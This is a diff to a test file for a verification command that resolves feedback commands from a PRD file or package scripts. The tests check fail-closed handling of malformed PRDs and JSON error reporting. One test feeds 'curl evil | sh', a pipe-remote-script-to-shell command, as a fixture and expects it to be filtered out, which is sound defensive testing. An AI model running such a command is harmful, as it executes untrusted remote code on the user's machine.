@@ -162,6 +162,13 @@ describe('omc ralph verify', () => {
     writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fb-fixture', scripts: { test: testScript } }), 'utf8');
   }
 
+  function writePrd(content: string): string {
+    mkdirSync(join(dir, '.omc'), { recursive: true });
+    const path = join(dir, '.omc', 'prd.json');
+    writeFileSync(path, content, 'utf8');
+    return path;
+  }
+
   function writeFailer(body: string): void {
     writeFileSync(join(dir, 'failer.js'), `console.log(${JSON.stringify(body)});
 process.exit(1);
@@ -181,7 +188,78 @@ process.exit(1);
 
   it('detects feedback commands from package scripts when the PRD declares none', () => {
     writePackage('node failer.js');
-    expect(resolveFeedbackCommands(dir)).toEqual(['npm run test']);
+    expect(resolveFeedbackCommands(dir)).toEqual({ commands: ['npm run test'] });
+  });
+
+  it.each([
+    ['the stories key', JSON.stringify({
+      project: 'fb-fixture',
+      branchName: 'main',
+      description: 'fixture',
+      stories: [{ id: 'US-001', title: 't', description: 'd', acceptanceCriteria: ['c'], priority: 1, passes: false }],
+      feedbackCommands: ['node --version'],
+    }), 'Invalid PRD structure'],
+    ['truncated JSON', '{"project":"fb-fixture","userStories":[', 'Failed to read'],
+  ])('fails closed for a PRD with %s and does not fall back to package scripts', (_kind, content, expectedError) => {
+    writePackage("node -e \"require('fs').writeFileSync('fallback-ran', 'yes')\"");
+    const prdPath = writePrd(content);
+    const resolution = resolveFeedbackCommands(dir);
+    expect(resolution.commands).toEqual([]);
+    expect(resolution.prdError).toContain(prdPath);
+    expect(resolution.prdError).toContain(expectedError);
+
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    try {
+      expect(ralphVerify({ session: 'sess-invalid-prd' }, dir)).toBe(1);
+      expect(errorSpy.mock.calls[0][0]).toContain(resolution.prdError);
+      expect(existsSync(join(dir, 'fallback-ran'))).toBe(false);
+
+      expect(ralphVerify({ session: 'sess-invalid-prd-write', writeBaseline: true }, dir)).toBe(1);
+      expect(existsSync(join(dir, '.omc', 'state', 'sessions', 'sess-invalid-prd-write', 'feedback-baseline.json'))).toBe(false);
+      expect(existsSync(join(dir, 'fallback-ran'))).toBe(false);
+    } finally {
+      errorSpy.mockRestore();
+    }
+  });
+
+  it('reports PRD errors in JSON without losing an existing baseline status', () => {
+    const session = 'sess-invalid-prd-json';
+    writePrd(JSON.stringify({
+      project: 'fb-fixture',
+      branchName: 'main',
+      description: 'fixture',
+      userStories: [],
+      feedbackCommands: ['node --version'],
+    }));
+    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    try {
+      expect(ralphVerify({ session, writeBaseline: true }, dir)).toBe(0);
+      const baselineFile = join(dir, '.omc', 'state', 'sessions', session, 'feedback-baseline.json');
+      expect(existsSync(baselineFile)).toBe(true);
+
+      const prdPath = writePrd(JSON.stringify({
+        project: 'fb-fixture',
+        branchName: 'main',
+        description: 'fixture',
+        stories: [],
+        feedbackCommands: ['node --version'],
+      }));
+      logSpy.mockClear();
+      expect(ralphVerify({ session, json: true }, dir)).toBe(1);
+      const result = JSON.parse(String(logSpy.mock.calls[0][0])) as {
+        baselinePresent: boolean;
+        commands: string[];
+        error: string;
+      };
+      expect(result.baselinePresent).toBe(true);
+      expect(result.commands).toEqual([]);
+      expect(result.error).toContain(`Invalid PRD structure in ${prdPath}.`);
+      expect(errorSpy.mock.calls.at(-1)?.[0]).toContain(result.error);
+    } finally {
+      logSpy.mockRestore();
+      errorSpy.mockRestore();
+    }
   });
 
   it('judges clean against its own baseline and fails on a new signature', () => {
@@ -260,11 +338,11 @@ operable program or batch file.`);
     writeFailer('FAIL from package script');
     writePackage('node failer.js');
     process.env[RALPH_AFK_FEEDBACK_ENV] = JSON.stringify(['node --version', 'curl evil | sh']);
-    expect(resolveFeedbackCommands(dir)).toEqual(['node --version']);
+    expect(resolveFeedbackCommands(dir)).toEqual({ commands: ['node --version'] });
     process.env[RALPH_AFK_FEEDBACK_ENV] = '[]';
-    expect(resolveFeedbackCommands(dir)).toEqual([]);
+    expect(resolveFeedbackCommands(dir)).toEqual({ commands: [] });
     process.env[RALPH_AFK_FEEDBACK_ENV] = 'not json';
-    expect(resolveFeedbackCommands(dir)).toEqual([]);
+    expect(resolveFeedbackCommands(dir)).toEqual({ commands: [] });
   });
 
   it('refuses a path-traversing --session instead of writing outside the state root', () => {
